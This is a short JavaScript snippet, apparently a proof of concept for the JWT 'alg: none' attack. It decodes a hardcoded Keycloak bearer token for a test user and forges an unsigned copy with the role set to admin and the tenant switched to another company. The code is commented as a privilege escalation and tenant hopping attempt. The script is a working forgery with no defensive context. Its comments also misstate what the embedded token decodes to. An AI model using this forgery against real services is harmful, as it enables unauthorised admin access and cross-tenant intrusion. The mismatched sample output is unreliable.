const token = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJBMTZtTG4xLUhEY0JpcFExX0E2NHRsRFdRZlphTU1STXdYNzVIV2dBMUlnIn0.eyJleHAiOjE3NzMzMTk5NjAsImlhdCI6MTc3MzMxOTY2MCwiYXV0aF90aW1lIjoxNzczMzE3MjQyLCJqdGkiOiJvbnJ0YWM6YTM2ODRkMmMtNDU4Ni03ODdiLTBmOTgtY2M2MTAxMjVmNjA1IiwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDo4MDgwL3JlYWxtcy9uZXdSZWFsbSIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiI5ODRlMTE3MC00MGJjLTRkZDUtYWNiOC1lOWYzNmQ2MzMyMjgiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJteWNsaWVudCIsInNpZCI6InhSVlJxd3FDUFFyclptZFozclVhZXpPcCIsImFjciI6IjAiLCJhbGxvd2VkLW9yaWdpbnMiOlsiKiJdLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsib2ZmbGluZV9hY2Nlc3MiLCJjbGllbnQiLCJkZWZhdWx0LXJvbGVzLW5ld3JlYWxtIiwiYWRtaW4iLCJ1bWFfYXV0aG9yaXphdGlvbiJdfSwicmVzb3VyY2VfYWNjZXNzIjp7ImFjY291bnQiOnsicm9sZXMiOlsibWFuYWdlLWFjY291bnQiLCJtYW5hZ2UtYWNjb3VudC1saW5rcyIsInZpZXctcHJvZmlsZSJdfX0sInNjb3BlIjoib3BlbmlkIGVtYWlsIHByb2ZpbGUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6InRlc3QgdGVzdCIsInByZWZlcnJlZF91c2VybmFtZSI6InRlc3QiLCJnaXZlbl9uYW1lIjoidGVzdCIsImZhbWlseV9uYW1lIjoidGVzdCIsImVtYWlsIjoidGVzdEBnbWFpbC5jb20ifQ.L2EcTDWIQuK62HqdwKVoKhS5hZg9ifit1C7k37lPzjMXqbuvQ_gq48ySFmW7DBw5pR4DYSrzLyFbDvvbhu8w29Wk-z4XoZJxM4ucd03g27e7FD8wTB1pVMHagcs7pda5N0lT110dqlvq_J5G2XuxfMw7EZ80JZ4M1wyCq18Hn0WCi8Lx6_U3itF9EkYVdUjwnMnqlYeUQ7lBNvm26-pjzYPqqklhSxz1hCqh_t2auiOfwBbp8akxrsbpg1nVEgOitT04Tx-IrhprAwaJDaUBY81MzzWrW3uSLLRLsCj7hL4fQ90feQcgejnb-6pBiqKAC4jU-h7aGIjLgWaa1PgSig";
const [header, payload, signature] = token.split('.');

// Decode each part
const decodedHeader = JSON.parse(Buffer.from(header, 'base64url').toString());
const decodedPayload = JSON.parse(Buffer.from(payload, 'base64url').toString());

console.log(decodedHeader);  // { alg: 'RS256', typ: 'JWT' }
console.log(decodedPayload); // { sub: 'user123', tenant_id: 'acme', role: 'viewer' }

// Change algorithm to none
const tamperedHeader = { alg: "none", typ: "JWT" };

// Optionally escalate privileges in payload
const tamperedPayload = {
    ...decodedPayload,
    role: "admin",           // privilege escalation attempt
    tenant_id: "other_corp"  // tenant hopping attempt
};


const encode = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');

const tamperedToken = `${encode(tamperedHeader)}.${encode(tamperedPayload)}.`;
//                                                                            ^ empty signature

console.log("Tampered token:", tamperedToken);